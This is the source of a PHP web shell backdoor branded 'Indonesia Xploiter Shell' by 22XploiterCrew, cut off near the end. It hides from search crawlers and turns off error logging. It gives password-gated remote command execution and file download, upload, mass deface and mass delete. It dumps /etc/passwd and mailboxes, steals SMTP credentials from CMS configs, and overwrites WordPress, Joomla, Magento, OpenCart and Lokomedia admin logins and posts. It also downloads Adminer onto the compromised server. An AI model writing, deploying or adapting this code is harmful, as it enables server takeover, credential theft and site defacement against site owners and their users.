<?php
/*

Recoded By IndoXploit

[ Official 22XploiterCrew ]

*/
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "07e99d5a7d32e5d5b305ea7c0fc7859e"; // default: pass huruf
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="widht=device-widht, initial-scale=1">
    <meta name="author" content="CodeXploit">
    <meta name="description" content="B3R4NTAKAN SH3LL BACKDOOR">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
    <link href="http://fonts.googleapis.com/css?family=Gloria Hallelujah|Mali|New Rocker" rel="stylesheet" type="text/css">
    <title>B3R4NTAKAN SH3LL</title>
    <style>
    	h5{font-family:"Mali";font-size:30px;}
    	small{font-family:"Mali";font-size:8px;}
    	img{margin:0;padding:0;width:195px;}
    </style>
  </head>
  <body class="bg-dark text-white">
  	
  <center>
  	<h5 class="mt-4">B3R4NTAKAN SH3LL V2</h5><hr>
    <div class="container mt-4">
    	<img src="http://pngimages.net/sites/default/files/blue-open-lock-png-image-34849.png" alt=""><hr>
    	<form method="post">
    	<input type="password" name="pass" class="form-control mb-3 text-primary" placeholder="Enter Key"><input type="submit" name="ok" class="btn btn-warning btn-block" value="Masuk"></form>
    	<small class="muted">
    		Copyright &copy; all right reserved Official 22XploiterCrew
    	</small>
    </div>
   </center>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
	
<title>Indonesia Xploiter Shell</title>
<meta name='author' content='22XploiterCrew'>
 <link href="http://fonts.googleapis.com/css?family=New Rocker" rel="stylesheet" type="text/css">
<meta charset="UTF-8">
<style>
body {
	background-image: url("https://images2.imgbox.com/e7/9a/8S4UsCsq_o.jpg");
	color: #ffffff;
}
li {
	display: inline-block;
	margin: 5px;
	padding: 5px;
	background-color: blue;
	text-align: center;
	width: 150px;
	border: 2px solid white;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: black;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid grey;
}
th {
	padding: 10px;
}
a {
	color: white;
	text-decoration: none;
}
a:hover {
	color: red;
	text-decoration: underline;
}
i {
	color: orange;
}
input[type=text], input[type=password],input[type=submit] {
	background: black; 
	color: white; 
	border: 1px solid red; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid darkred;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: black;
	color: white;
	font-family: 'Ubuntu';
	font-size: 13px;
}
h2 {
	color: red;
	font-family: "New Rocker";
	font-size: 54px;
}
.memek {
	background-color: black;
	border: 1px solid red;
	font-size: 13px;
	padding-left: 5px;
}
.xp {
	width: 100px;
	height: 100px;
	float: left;
	padding-left: 10px;
	padding-top: 24px;
}
.px {
	width: 100px;
	height: 100px;
	float: right;
	padding-right: 10px;
	padding-top: 25px;
}
.hekeke {
	background-color: black;
	font-size: 16px;
	color: black;
	border: 2px solid white;
}
.uah {
	background-color: black;
	font-size: 28px;
	color: white;
	border: 2px solid red;
}
.ekeng {
	background-color: black;
	font-size: 28px;
	color: white;
	border: 2px solid red;
}
.ekeng:hover {
	background-color: black;
	font-size: 28px;
	color: white;
	border: 2px solid red;
	float: left;
}
.jancok {
	font-size: 15px;
	color: lime;
}
.asu {
	font-size: 15px;
	color: red;
}
.gas {
	font-size: 14px;
}
.bantal {
	display: inline-block;
	width: 1000px;
	background-color: black;
}
.herek {
	font-size: 6px;
	background-color: black;
}
.herel {
	font-size: 6px;
	background-color: black;
}
</style>
</head>
<body><div class="memek">
	<img class="xp" src="https://assets-a2.kompasiana.com/items/album/2016/09/23/pancasila-welogo-blogspot-com-57e4de715c7b615612d54909.png?t=o&v=350" alt="22Xploit"><img class="px" src="https://assets-a2.kompasiana.com/items/album/2016/09/23/pancasila-welogo-blogspot-com-57e4de715c7b615612d54909.png?t=o&v=350" alt="22Xploit">
	<center>
	<h2>Indonesia Xploiter Shell</h2>
	</center>
</div><br>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
	// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function ixs_ss($array) {
		return is_array($array) ? array_map('ixs_ss', $array) : stripslashes($array);
	}
	$_POST = ixs_ss($_POST);
}

error_reporting(0);
error_log(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
	$dir = str_replace("\\","/",$dir);
	$scdir = explode("/", $dir);
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
echo "<font color='lime' size='2'>Current => </font>";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a size='2' href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "<br><br>";
echo "<center>";
echo "<div class='hekeke'>";
echo "<ul>";
echo "<li><a href='?'>Home</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=upload'>Upload</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=cmd'>Command</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=mass_deface'>Mass Deface</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=mass_delete'>Mass Delete</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=hash'>Hash Generator</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=jumping'>Jumping</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=adr'>Adminer</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=autowp'>Auto Edit Title Wp</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=lapor'>Symlink</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=balit'>Cms Balitbang</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=autoedit'>Auto Edit User</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=zoneh'>Zone-H</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=delle'>Kick Shell</a></li>";
echo "<li><a href='?dir=$dir&XploiterCrew=thx'>About</a></li>";
echo "<li> <a href='?logout=true'>Logout</a> </li>";
if($_GET['logout'] == true) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
}
echo "</ul>";
echo "</div>";
if($_GET['XploiterCrew'] == 'delle') {
			
					echo "<form method='post'><center><br><br><font color=red size=10>Serius?</font><br><br><button type='submit' name='fuckoff' class='uah'>IYA</button><br><br><button class='ekeng'>Tidak</button></form>";
					if(isset($_POST['fuckoff'])) {
					if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {
						die('<font style=color: red; font-family: cursive; font-size: 200%;><br><br>Shell <span style=color: teal; size=4>Telah</span> Terhapus</span>');}
				}
}elseif($_GET['XploiterCrew'] == 'balit'){
echo "<center><h1>CMS Balitbang</h1><form method='post'><center><p>Target URL : <input style='border-color=white;' type='text' name='url' class='text' placeholder='http://127.0.0.1/' size=50></p></p><p><input type='submit' name='send' class='kotak' style='border-color=white;' value='Kunci Target'></p></center></form>";
if (isset($_POST['send'])) {
    $url = $_POST['url'];
    $resulturl = "Target URL : $url";
    echo "<center><hr color='white'><br>
$resulturl
$resultoken
</center>";
echo '<center style="border-color=white;"><form enctype="multipart/form-data" action="'.$url.'/files/tugas/tgs-ganteng.phtml" method="post"></center>';
echo '<center style="border-color=white;"><input name="file" type="file"><input type="submit" class="kotak" value="Upload"><br><br>Format file: shell.phtml ato shell.php5</center>';
}
echo "</div>";
}elseif($_GET['XploiterCrew'] == 'hash') {
 $submit = $_POST['enter'];
   
 if (isset($submit)) {
     
   $pass = $_POST['password']; // password
      
  $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 
     $hash = md5($pass); // md5 hash #1
     
   $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
   
     $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
     
   $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
     
   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
       
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
     
   
    }
    echo '<form method="post"><b> ';
echo ' <center><b>Masukkan kata yang ingin di encrypt:</b> ';
echo ' <br><input class="inputz" type="text" name="password" size="40" />'; 
echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';  
echo ' <br>';
echo ' <font color=lime>Hasil Hash</font></th></center></tr>'; 
echo ' <font class=gas>Password Original<br><input class=inputz type=text size=50 value=' . $pass . '> <br><br>'; 
echo ' MD5<br><input class=inputz type=text size=50 value=' . $hash . '> <br><br>';
    
echo ' MD4<br><input class=inputz type=text size=50 value=' . $md4 . '> <br><br>';
    
echo ' MD5 with Salt<br><input class=inputz type=text size=50 value=' . $hash_md5 . '> <br><br>';
  
  echo ' MD5 with Salt & Sha1<br><input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br><br>';

    echo ' Sha1<br><input class=inputz type=text size=50 value=' . $hash1 . '> <br><br>';
 
   echo ' Sha256<br><input class=inputz type=text size=50 value=' . $sha256 . '> <br><br>';
 
   echo ' Sha1 with Salt<br><input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br><br>';
 
   echo ' Sha1 with Salt & MD5<br><input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> <br><br></font>';

if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
}elseif($_GET['XploiterCrew'] == 'autowp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<form method='post'>
		Config<br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Title<br>
		<input type='text' name='new_title' value='Hacked by 22Xploit Hacker Team' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Oke' style='width: 450px;'><br>
		</form>";
	}
}elseif($_GET['XploiterCrew'] == 'autoedit') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=yellow>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=yellow>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=yellow>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=yellow>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=yellow>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Username<br>
		<input type='text' name='user_baru' value='22Xploiter Crew' placeholder='user_baru'><br>
		Password<br><input type='text' name='pass_baru' value='22Xploiter Crew' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Oke' style='width: 215px;'>
		</form>";
	}
}elseif($_GET['XploiterCrew'] == 'dmn'){
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;

}elseif($_GET['XploiterCrew'] == 'adr') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=aqua><a href='$full/adminer.php' target='_blank'>☆ Login ☆</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=aqua><a href='$full/adminer.php' target='_blank'>☆ Login ☆</a></font></center>";
		} else {
			echo "<center><font color=lime>Gagal Membuat File Adminer</font></center>";
		}
	}
}elseif($_GET['XploiterCrew'] == 'thx'){
